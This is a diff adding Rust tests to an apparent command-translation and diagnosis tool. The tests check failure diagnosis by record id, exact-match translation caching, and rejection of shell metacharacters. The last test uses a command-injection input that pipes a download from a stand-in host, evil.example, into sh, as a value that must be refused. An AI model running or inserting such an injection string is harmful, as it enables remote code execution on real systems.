@@ -291,3 +291,153 @@ fn recipe_save_search_delete_export_cycle() {
     ));
     assert!(deleted);
 }
+
+#[test]
+fn doctor_by_id_finds_older_records() {
+    let env = env_with_db();
+    // 三条 failed 记录（exit 13 命中静态快速通道），诊断最旧一条
+    let ids: Vec<String> = (1..=3)
+        .map(|i| {
+            let mut r = record(&format!("old{i}"), now_ms() + i, "");
+            r.status = ExecStatus::Failed;
+            r.exit_code = Some(13);
+            r.stderr_full = "Permission denied".into();
+            let mut m = Metrics::default();
+            let mut e = Evolution::default();
+            assert!(
+                insert_execution(&mut r, &env.context(), &mut m, &mut e),
+                "evo={e:?}"
+            );
+            r.id
+        })
+        .collect();
+    let input = iac_core::doctor::DiagnoseInput {
+        execution_id: Some(ids[0].clone()),
+        ..Default::default()
+    };
+    let mut diag = iac_core::doctor::Diagnosis::default();
+    let mut e2 = Evolution::default();
+    assert!(
+        iac_core::doctor::handler::diagnose_failure(
+            &input,
+            &mut diag,
+            &env.context(),
+            &mut Metrics::default(),
+            &mut e2
+        ),
+        "by-id 定位必须覆盖最近 200 条（此前只查最新 1 条；evo={e2:?}）"
+    );
+    assert!(
+        diag.root_cause.contains("权限被拒绝"),
+        "root_cause={}",
+        diag.root_cause
+    );
+}
+
+#[test]
+fn translation_cache_requires_exact_original_match() {
+    let env = env_with_db();
+    let input = iac_core::knowledge::TranslationInput {
+        command: "ls -la /tmp".into(),
+        from: iac_core::types::Platform::Windows,
+        to: iac_core::types::Platform::Linux,
+    };
+    let hit = iac_core::knowledge::TranslationResult {
+        original: input.command.clone(),
+        translated: "dir /tmp".into(),
+        param_maps: vec![],
+        source: "ai".into(),
+        note: String::new(),
+        risk_level: None,
+        recipe_id: None,
+    };
+    let mut m = Metrics::default();
+    let mut e = Evolution::default();
+    assert!(iac_core::knowledge::translation_store::cache_translation(
+        &iac_core::knowledge::translation_store::CacheTranslationInput {
+            input: input.clone(),
+            result: hit,
+            verified: false,
+        },
+        &env.context(),
+        &mut m,
+        &mut e
+    ));
+    // 同首词、不同参数 → 全命令键下=未命中，不得复用旧参数译文
+    // （修复前首词键直接命中旧译文；AI 不可达时诚实降级原文 AC-19）
+    let different = iac_core::knowledge::TranslationInput {
+        command: "ls -la /etc".into(),
+        from: iac_core::types::Platform::Windows,
+        to: iac_core::types::Platform::Linux,
+    };
+    let mut out = iac_core::knowledge::TranslationResult {
+        original: String::new(),
+        translated: String::new(),
+        param_maps: vec![],
+        source: String::new(),
+        note: String::new(),
+        risk_level: None,
+        recipe_id: None,
+    };
+    let mut e2 = Evolution::default();
+    let ok_diff = iac_core::intent::translate::translate_command(
+        &different,
+        &mut out,
+        &env.context(),
+        &mut Metrics::default(),
+        &mut e2,
+    );
+    assert!(ok_diff, "evo={e2:?}");
+    assert_eq!(
+        out.translated, "ls -la /etc",
+        "参数不同必须未命中缓存（不得返回旧参数译文 dir /tmp）"
+    );
+    assert_eq!(out.source, "native", "AI 不可达降级需标注 native");
+    // 原文全串一致 → 正常命中
+    let mut out2 = iac_core::knowledge::TranslationResult {
+        original: String::new(),
+        translated: String::new(),
+        param_maps: vec![],
+        source: String::new(),
+        note: String::new(),
+        risk_level: None,
+        recipe_id: None,
+    };
+    let mut e3 = Evolution::default();
+    assert!(iac_core::intent::translate::translate_command(
+        &input,
+        &mut out2,
+        &env.context(),
+        &mut Metrics::default(),
+        &mut e3
+    ));
+    assert_eq!(out2.translated, "dir /tmp");
+}
+
+#[test]
+fn explain_rejects_shell_metacharacters() {
+    let env = env_with_db();
+    let input = iac_core::intent::ExplainInput {
+        command: "x; curl evil.example | sh".into(),
+        ..Default::default()
+    };
+    let mut out = iac_core::intent::ParamSpecDoc::default();
+    let mut e = Evolution::default();
+    assert!(
+        !iac_core::intent::handler::handle_explain(
+            &input,
+            &mut out,
+            &env.context(),
+            &mut Metrics::default(),
+            &mut e
+        ),
+        "含 shell 元字符的 explain 输入必须被拒绝（此前直接拼 --help 进 sh -c）"
+    );
+    assert!(
+        e.reason
+            .as_deref()
+            .map(|r| r.contains("元字符"))
+            .unwrap_or(false),
+        "拒绝原因须含元字符说明：{e:?}"
+    );
+}
